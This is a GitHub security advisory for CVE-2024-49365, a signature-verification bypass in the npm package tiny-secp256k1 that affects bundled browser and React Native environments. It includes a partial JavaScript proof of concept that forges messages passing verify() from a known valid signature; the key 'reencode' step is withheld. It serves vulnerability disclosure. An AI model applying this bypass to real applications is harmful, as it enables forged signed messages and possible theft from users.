# [H] tiny-secp256k1 allows for verify() bypass when running in bundled environment

## Summary
Severity: High
Advisory: GHSA-5vhg-9xg4-cv9m
CVE: CVE-2024-49365
CWE: CWE-347
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-06-30
Source: https://github.com/advisories/GHSA-5vhg-9xg4-cv9m
Type: github-advisory

## Affected
- npm: `tiny-secp256k1` — affected >=0 <1.1.7

## Details
### Summary

A malicious JSON-stringifyable message can be made passing on `verify()`, when global Buffer is [`buffer` package](https://www.npmjs.com/package/buffer)

### Details

This affects only environments where `require('buffer')` is <https://npmjs.com/buffer>
E.g.: browser bundles, React Native apps, etc.

`Buffer.isBuffer` check can be bypassed, resulting in strange objects being accepted as `message`, and those messages could trick `verify()` into returning false-positive `true` values

v2.x is unaffected as it verifies input to be an actual `Uint8Array` instance

Such a message can be constructed for any already known message/signature pair
There are some restrictions though (also depending on the known message/signature), but not very limiting, see PoC for example

https://github.com/bitcoinjs/tiny-secp256k1/pull/140 is a subtle fix for this

### PoC

This code deliberately doesn't provide `reencode` for now, could be updated later

```js
import { randomBytes } from 'crypto'
import tiny from 'tiny-secp256k1' // 1.1.6

// Random keypair
const privateKey = randomBytes(32)
const publicKey = tiny.pointFromScalar(privateKey)

const valid = Buffer.alloc(32).fill(255) // let's sign a static buffer
const signature = tiny.sign(valid, privateKey)

// Prevent processing any unverified data by fail-closed throwing
function verified(data, signature) {
  if (!Buffer.isBuffer(data)) data = Buffer.from(data, 'hex')
  if (!tiny.verify(data, publicKey, signature)) throw new Error('Signature invalid!')
  return new Uint8Array(data)
}

function safeProcess(payload) {
  const totally = JSON.parse(payload) // e.g. json over network

  const message = verified(totally, signature)
  console.log(message instanceof Uint8Array)
  console.log(Buffer.from(message).toString('utf8'))  
}

const payload = reencode(valid, "Secure contain protect")
safeProcess(payload)
```

Output (after being bundled):
```console
true
Secure contain protect����
```

### Impact

Malicious messages could crafted to be verified from a given known valid message/signature pair

## References
- https://github.com/bitcoinjs/tiny-secp256k1/security/advisories/GHSA-5vhg-9xg4-cv9m
- https://nvd.nist.gov/vuln/detail/CVE-2024-49365
- https://github.com/bitcoinjs/tiny-secp256k1/pull/140
- https://github.com/bitcoinjs/tiny-secp256k1
